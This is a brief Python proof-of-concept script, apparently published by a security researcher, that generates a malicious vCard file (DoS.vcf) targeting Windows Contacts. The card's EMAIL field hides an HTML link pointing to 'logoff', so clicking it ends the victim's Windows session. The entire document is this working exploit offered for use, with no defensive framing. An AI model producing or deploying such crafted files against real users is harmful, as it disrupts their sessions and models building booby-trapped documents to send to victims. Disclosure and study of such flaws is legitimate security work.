#Microsoft Windows VCF Card Mailto Link Denial Of Service
#hyp3rlinx

dirty_vcf=(
'BEGIN:VCARD\n'
'VERSION:4.0\n'
'FN:Session Terminate PoC - ApparitionSec\n'
'EMAIL:<a href="logoff">pwn@microsoft.com</a>\n'
'END:VCARD')

f=open("DoS.vcf", "w")
f.write(dirty_vcf)
f.close()

print "VCF Denial Of Service card created!"
print "by hyp3rlinx"
